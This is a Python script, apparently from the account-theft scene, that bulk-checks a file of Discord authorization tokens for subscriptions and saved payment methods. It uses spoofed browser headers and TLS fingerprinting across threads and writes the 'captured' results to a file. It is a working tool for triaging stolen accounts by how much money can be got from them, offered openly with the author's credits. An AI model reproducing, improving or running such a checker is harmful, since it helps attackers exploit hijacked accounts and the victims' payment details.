import colorama
import requests
import tls_client
from colorama import Fore
import os
import concurrent.futures
session = tls_client.Session(
    client_identifier="chrome112"
)
# skids go away
os.system("cls")
colorama.init()

def console(color, prefix, message):
    return print(f"{color}( {prefix} ) -> {message}{Fore.RESET}")

console(Fore.LIGHTBLUE_EX, "INFO", "TOOL: Discord pms checker [ token based ]")
print("")

subsUrl = "https://discord.com/api/v9/users/@me/billing/subscriptions"
pmsUrl = "https://discord.com/api/v9/users/@me/billing/payment-sources"

class MainCode:
    def __init__(self, tokens):
        self.tokens = tokens

    def checkPms(self, token):
        capture_text = f"{token}, "
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": token,
            "Referer": "https://discord.com/channels/1175432049084088480/1181249873937449024",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Europe/Budapest",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjAuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjAuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjU4NTg5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
        }

        try:
            ref_url = requests.get(subsUrl, headers=headers)
            ref_url.raise_for_status()
        except requests.RequestException as e:
            console(Fore.LIGHTRED_EX, "ERROR", f"ERROR OCCURRED WHILE CHECKING SUBSCRIPTION | TOKEN={token[:20]}... | Token i probably invalid")
            return

        if not ref_url.json():
            console(Fore.LIGHTYELLOW_EX, "LOG", f"No Subscription detected. | Token={token[:23]}.... | Response={ref_url.text}")
            capture_text += "No Subscription, "
        else:
            if ref_url.status_code == 401:
                console(Fore.LIGHTRED_EX, "INVALID-TKN", f"INVALID TOKEN PROVIDED | TOKEN={token[:23]}....")
                return
            console(Fore.LIGHTGREEN_EX, "LOG", f"Subscription Detected | Token={token[:23]}... | Subs: {ref_url.json()}")
            capture_text += f"Subscriptions: {ref_url.text}"

        # payment methods checker :D
        pmsRq = session.get(pmsUrl, headers=headers)

        if not pmsRq.json():
            console(Fore.LIGHTRED_EX, "BAD-LOG", f"NO PAYMENT METHOD FOUND.... | Token={token[:23]}.... | Response={pmsRq.text}")
            capture_text += "No Payment Method, Code By virtuoso_s" # fuck u if u skid and dont give credits
        else:
            console(Fore.LIGHTGREEN_EX, "GOOD-LOG", f"Payment method found... | token={token[:23]} | Response={pmsRq.json()}")
            capture_text += f"Payment methods: {pmsRq.text}, Code by virtuoso_s"
        with open('captured.txt', 'a') as captures:
            captures.write(capture_text)

def check_tokens(token):
    instance.checkPms(token)

tokens = open('tokens.txt').read().splitlines()
instance = MainCode(tokens)

num_threads = 5

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(check_tokens, tokens)
input("")
